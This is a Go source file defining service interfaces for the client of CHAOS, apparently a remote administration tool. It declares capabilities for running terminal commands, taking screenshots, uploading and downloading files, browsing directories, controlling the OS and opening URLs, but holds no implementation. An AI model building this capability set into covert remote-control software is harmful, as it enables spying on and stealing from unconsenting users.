package services

import (
	"errors"
	"github.com/tiagorlampert/CHAOS/client/app/entities"
	"time"
)

var (
	ErrUnsupportedPlatform = errors.New("unsupported platform")
	ErrDeadlineExceeded    = errors.New("command deadline exceeded")
)

type Services struct {
	Information
	Terminal
	Screenshot
	Download
	Upload
	Explorer
	OS
	URL
}

type Information interface {
	LoadDeviceSpecs() (*entities.Device, error)
}

type Terminal interface {
	Run(cmd string, timeout time.Duration) string
}

type Screenshot interface {
	TakeScreenshot() ([]byte, error)
}

type Upload interface {
	UploadFile(path string, uri string, paramName string) ([]byte, error)
}

type Download interface {
	DownloadFile(filepath string) ([]byte, error)
}

type Explorer interface {
	ExploreDirectory(path string) (*entities.FileExplorer, error)
}

type OS interface {
	Restart() error
	Shutdown() error
	Lock() error
	SignOut() error
}

type URL interface {
	OpenURL(url string) error
}
